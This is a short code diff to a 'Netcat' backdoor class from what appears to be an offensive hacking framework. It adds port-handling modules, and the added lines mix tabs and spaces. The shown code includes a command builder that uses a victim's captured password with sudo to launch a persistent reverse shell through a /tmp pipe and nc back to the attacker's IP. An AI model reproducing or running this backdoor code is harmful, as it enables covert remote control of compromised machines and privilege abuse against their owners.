@@ -12,7 +12,12 @@ class Netcat(Backdoor):
                 }
         self.allow_modules = True
         self.modules = {} 
+	self.portModules = {}
+	
         
+    def get_port(self):
+        return self.get_value("port")
+
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S nohup cat /tmp/f | /bin/sh -i 2>&1 | nc " + self.core.localIP + " %s > /tmp/f" % self.get_value("port")
  
@@ -29,3 +34,7 @@ class Netcat(Backdoor):
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
             mod.exploit(self.get_command())
+	for mod in self.portModules.keys():
+            print(INFO + "Attempting to execute " + mod.name + " module...")
+            mod.exploit(self.get_port())
+
